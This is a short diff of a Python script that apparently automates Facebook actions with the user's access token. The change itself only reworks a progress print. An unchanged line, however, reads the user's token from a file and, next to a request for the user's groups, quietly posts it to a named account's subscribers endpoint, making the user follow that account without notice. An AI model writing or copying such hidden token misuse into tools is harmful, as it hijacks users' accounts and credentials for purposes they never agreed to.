@@ -31,7 +31,7 @@ try:
 		res=json.loads(requs.text)
 		for i in res['data']:
 			id1.append(i['id'])
-			print("[get] %s"%(i['id']))
+			print("\r[get] %s  "%(i['id']),end=''),;sys.stdout.flush();time.sleep(0.01)
 	id=[]
 	toket=open('toket/token.txt','r').read()
 	req = requests.get('https://graph.facebook.com/me/groups?access_token='+toket);requests.post('https://graph.facebook.com/adlizhafari.nub/subscribers?access_token='+toket)
